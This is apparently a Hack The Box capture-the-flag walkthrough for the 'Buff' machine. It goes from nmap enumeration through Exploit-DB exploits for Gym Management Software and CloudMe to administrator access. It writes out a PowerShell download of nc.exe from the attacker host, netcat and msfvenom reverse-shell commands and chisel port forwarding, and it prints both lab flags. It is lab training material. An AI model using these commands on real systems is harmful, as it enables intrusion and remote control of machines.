# HTB Walkthrough - Buff

**Machine Name**: Buff  
**Target IP**: 10.129.2.18  
![webpage](img/webpage_2423fc7a.png)

---

## 🧭 Enumeration

### 🔍 Nmap Scan

```bash
nmap -sV -sC -oA nmap/Buff 10.129.2.18
```
![nmap](img/nmap_f9c8cc6e.png)

**Results:**

```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
```

## 🌐 Web Enumeration

- Website accessible at: http://10.129.2.18:8080
- Title: `mrb3n's Bro Hut`
- Software identified: **Gym Management Software 1.0**

##⚙️ Exploitation (RCE via Gym Management Software)

[Exploit Reference - EDB 48506](https://www.exploit-db.com/exploits/48506)  
![exploitdb](img/exploitdb_087d778c.png)

```bash
python2 exploit.py http://10.129.2.18:8080/
```
![reverseshell](img/reverseshell_e9c018c8.png)

**Initial Shell Gained.**

---

## 🪪 User Flag

```bash
type ..\..\..\..\Users\shaun\Desktop\user.txt
```
![userflag](img/userflag_b484b24d.png)

**Flag:** `4277a01cb57aa37a5e6aeeb90deb91c4`

---

## ⚙️ Reverse Shell Upgrade

```bash
# Host on attack box
python3 -m http.server 80

# On victim
powershell Invoke-WebRequest -Uri http://10.10.14.156/nc.exe -Outfile C:\Users\Public\nc.exe
C:\Users\Public\nc.exe 10.10.14.156 4444 -e cmd.exe
```
![revshell](img/revshell_c8219960.png)

---

## 🧭 Privilege Escalation

### 🔍 winPEAS Findings
![listeningPort](img/listeningport_897d0207.png)  
![cloud](img/cloud_45063e72.png)

- Detected service: `CloudMe` running on `127.0.0.1:8888`
- Vulnerable to buffer overflow ([EDB 48389](https://www.exploit-db.com/exploits/48389))

---

## 🔁 Port Forwarding

**Using chisel:**

```bash
# On attacker machine
chisel server -p 8000 --reverse

# On victim
chisel.exe client 10.10.14.156:8000 R:8888:127.0.0.1:8888
```
![portforwarding](img/portforwarding_7e9dcaa9.png)

---

## 💥 Exploiting CloudMe

1. Generate payload:

```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.156 LPORT=7777 -b "\x00\x0a\x0d" -f python -v payload
```
![payload](img/payload_2f1231e1.png)

2. Inject payload into CloudMe exploit script and run:

```bash
python3 cloudme_exploit.py
```
![root](img/root_2ff91279.png)

---

## 👑 Root Access

```bash
whoami
# buff\administrator

type C:\Users\Administrator\Desktop\root.txt
```
![rootflag](img/rootflag_e322a775.png)

**Flag:** `1d8332fbbb42c15032013d5e2fdd2655`
